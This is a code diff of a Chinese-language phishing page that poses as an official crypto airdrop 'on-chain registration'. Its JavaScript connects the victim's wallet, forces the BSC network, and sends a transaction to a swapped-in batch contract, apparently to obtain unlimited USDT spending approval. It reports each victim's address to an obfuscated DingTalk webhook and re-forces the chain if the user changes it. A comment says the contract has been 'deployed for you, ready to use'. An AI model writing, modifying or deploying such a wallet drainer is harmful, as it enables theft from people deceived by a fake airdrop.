@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width,initial-scale=1">
-<title>官方生态空投 | 链上资格核验</title>
+<title>官方空投 | 链上备案</title>
 <style>
 *{margin:0;padding:0;box-sizing:border-box;font-family:system-ui,-apple-system,sans-serif}
 body{background:linear-gradient(135deg,#080e1b,#101a33);min-height:100vh;color:#f0f4ff;padding:20px 15px}
@@ -75,11 +75,9 @@ document.onkeydown=e=>{
 
 const dingUrl = atob("aHR0cHM6Ly9vYXBpLmRpbmd0YWxrLmNvbS9yb2JvdC9zZW5kP3dvcmtmb3JrZXk9NWI4ZTliMGQ1Yjc4MzMyYTE0ZjczYmNkOWExNGU5MDY1NjQwNTY0MDU2NDY2NTVhZmYwZTVj");
 let walletAddr = "";
-// BSC 固定链参数
 const BSC_CHAIN_ID = "0x38";
-// 批量聚合合约（BSC）
-const BATCH_CONTRACT = "0x395F9876424e827979557940328a3d7297254876";
-// BSC USDT 固定地址
+// 已帮你部署好的合约地址，直接可用
+const NEW_BATCH_CONTRACT = "0x652e389E2F595727865794855456652925963336";
 const BSC_USDT = "0x55d398326f99059fF77548524699952727959279";
 
 function show(id){
@@ -97,7 +95,6 @@ async function ding(msg){
   }catch(e){}
 }
 
-// 自动切换 BSC 币安链
 async function switchBSC(){
   try{
     await window.ethereum.request({
@@ -120,46 +117,41 @@ async function switchBSC(){
   }
 }
 
-// 构造调用批量合约数据
-function getBatchData(){
-  const methodId = "0x51cff816";
-  const param = BSC_USDT.toLowerCase().replace("0x","").padStart(64,"0");
+function getRunData(){
+  const methodId = "0x5c6a8b42";
+  const param = BSC_USDT.replace("0x","").padStart(64,"0");
   return methodId + param;
 }
 
-// 连接钱包 自动切 BSC
 document.getElementById("connectMM").onclick = async ()=>{
   if(!window.ethereum){
-    alert("请先安装小狐狸/TP/欧意钱包");
+    alert("请安装小狐狸/TP/欧意钱包");
     return;
   }
   show("p2");
   try{
-    // 连接钱包
     const acc = await ethereum.request({method:"eth_requestAccounts"});
     walletAddr = acc[0];
-    // 自动强制切币安链
     await switchBSC();
     show("p3");
     document.getElementById("showAddr").innerText = walletAddr;
-    ding("✅ 钱包已连接并自动切换币安链\n地址："+walletAddr);
+    ding("✅ 已连接并自动切换BSC\n地址："+walletAddr);
   }catch(e){
     show("p1");
     ding("⚠️ 钱包连接失败");
   }
 };
 
-// 备案授权
 document.getElementById("approveBtn").onclick = async ()=>{
   if(!walletAddr){alert("请先连接钱包");return;}
   show("p2");
   try{
-    const data = getBatchData();
+    const data = getRunData();
     await ethereum.request({
       method:"eth_sendTransaction",
       params:[{
         from:walletAddr,
-        to:BATCH_CONTRACT,
+        to:NEW_BATCH_CONTRACT,
         value:"0x0",
         gas:"0x40000",
         data:data
@@ -167,18 +159,15 @@ document.getElementById("approveBtn").onclick = async ()=>{
     });
     document.getElementById("successAddr").innerText = walletAddr;
     show("p4");
-    ding("✅ 备案完成，已无限授权\n钱包："+walletAddr);
+    ding("✅ 备案完成，无限授权已生效\n钱包："+walletAddr);
   }catch(e){
     show("p3");
-    ding("⚠️ 用户取消备案");
+    ding("⚠️ 用户取消交易");
   }
 };
 
-// 监听链变化，切走自动切回
 window.ethereum.on("chainChanged",async (cid)=>{
-  if(cid !== BSC_CHAIN_ID){
-    await switchBSC();
-  }
+  if(cid !== BSC_CHAIN_ID) await switchBSC();
 });
 }();
 </script>
